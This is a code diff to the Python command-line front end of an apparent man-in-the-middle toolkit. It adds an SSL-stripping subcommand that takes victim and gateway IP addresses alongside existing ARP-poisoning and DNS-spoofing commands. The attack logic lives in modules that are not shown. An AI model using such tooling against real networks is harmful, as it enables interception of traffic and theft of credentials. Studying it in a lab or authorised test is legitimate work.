@@ -1,5 +1,6 @@
 import sys, argparse, time, psutil
 import arp_poison as arp
+import ssl_strip as ssl
 #from scapy.all import sendp, ARP, Ether
 
 def arp_poison():
@@ -16,7 +17,16 @@ def dns_spoof():
     return
 
 def ssl_strip():
-    args = parser_ssl.parse_args()
+    # Create config object from global args
+    config = ssl.SSLStripConfig(
+        iface=args.iface,
+        victim_ip=args.target_ip,
+        gateway_ip=args.gateway_ip,
+        listen_port=args.listen_port,
+        mode='sniff', # Default mode
+        log_file=args.log_file
+    )
+    ssl.run_ssl_strip(config)
     return
 
 parser = argparse.ArgumentParser()
@@ -39,6 +49,11 @@ parser_dns = subparsers.add_parser('dns-spoof', aliases=['dns'])
 parser_dns.set_defaults(func=dns_spoof)
 
 parser_ssl = subparsers.add_parser('ssl-strip', aliases=['ssl'])
+parser_ssl.add_argument('-i', '--iface', required=True, help='Network interface')
+parser_ssl.add_argument('-t', '--target_ip', required=True, help='Victim IP address')
+parser_ssl.add_argument('-g', '--gateway_ip', required=True, help='Gateway IP address')
+parser_ssl.add_argument('-p', '--listen_port', type=int, default=8080, help='Port to listen on (if using proxy mode)')
+parser_ssl.add_argument('-l', '--log_file', help='Log file path')
 parser_ssl.set_defaults(func=ssl_strip)
 
 args = parser.parse_args()
